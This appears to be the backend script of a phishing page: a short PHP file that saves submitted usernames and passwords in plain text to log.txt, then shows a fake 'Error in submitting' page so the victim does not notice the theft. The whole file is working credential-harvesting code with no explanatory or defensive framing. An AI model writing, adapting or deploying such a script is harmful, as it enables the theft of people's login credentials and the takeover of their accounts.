<?php
  $user = $_POST['username'];
  $pass = $_POST['password'];

  $file = fopen("log.txt", "a");
  fwrite($file, "Username: $user | Password: $pass\n");
  fclose($file);
?>

<!DOCTYPE html>
<html>
<head>
  <title>Error</title>
  <style>
    body {
      background-color: #fbeaea;
      font-family: Arial;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: red;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div>Error in submitting</div>
</body>
</html>
